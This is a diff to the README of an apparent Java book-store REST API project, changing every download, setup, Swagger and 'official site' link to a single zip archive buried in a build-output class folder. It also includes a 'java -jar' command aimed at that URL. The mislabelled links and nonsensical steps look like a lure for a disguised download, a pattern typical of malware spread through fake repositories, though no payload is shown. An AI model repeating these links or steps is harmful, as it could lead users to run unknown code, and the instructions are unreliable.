@@ -6,7 +6,7 @@ Welcome to the RestFull-Book-Store-API! This application helps you manage books 
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip)
+[![Download Latest Release](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip)
 
 ## 💾 System Requirements
 
@@ -32,21 +32,21 @@ Before you start, ensure your system meets the following requirements:
 
 To set up the RestFull-Book-Store-API:
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip) to find the latest version.
+1. **Visit the Releases Page:** Go to [this link](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip) to find the latest version.
 2. **Download the Application:** Look for the latest release and download it. You will find files related to various operating systems.
 3. **Extract Files:** After downloading, extract the files to a folder on your computer.
 4. **Setup Database:** 
    - Make sure MySQL Server is running.
    - Create a database named `book_store`.
 5. **Configure Application Properties:** 
-   - Open the `https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip` file.
+   - Open the `https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip` file.
    - Update the MySQL connection details (username, password, and URL).
 6. **Run the Application:**
    - Open your command prompt or terminal.
    - Navigate to the folder where you extracted the files.
    - Run the following command:
      ```
-     java -jar https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip
+     java -jar https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip
      ```
 
 ## 🌐 API Access
@@ -73,7 +73,7 @@ To add a new book, send a POST request with the following JSON body:
 
 ## 📚 Exploring Endpoints
 
-You can explore the available endpoints using the Swagger documentation. Simply navigate to `https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip` in your web browser.
+You can explore the available endpoints using the Swagger documentation. Simply navigate to `https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip` in your web browser.
 
 ## 🔄 Contributing to the Project
 
@@ -89,13 +89,13 @@ Feel free to reach out for support. You can open issues in the repository if you
 
 ## 🔗 References
 
-- [Java Official Site](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip)
-- [MySQL Official Site](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip)
-- [Postman Official Site](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip)
-- [Swagger Official Site](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip)
+- [Java Official Site](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip)
+- [MySQL Official Site](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip)
+- [Postman Official Site](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip)
+- [Swagger Official Site](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip)
 
 ## 📥 Download Now Again
 
-[![Download Latest Release](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Grasyypc/RestFull-Book-Store-API/main/heavenless/RestFull-Book-Store-API.zip) 
+[![Download Latest Release](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip%20Latest%20Release-v1.0-blue)](https://github.com/Grasyypc/RestFull-Book-Store-API/raw/refs/heads/main/BookStore-Api/target/classes/com/backend/entity/Store-Rest-Book-Full-API-v1.6.zip) 
 
 Now you're ready to start using the RestFull-Book-Store-API! Enjoy your new digital library system.
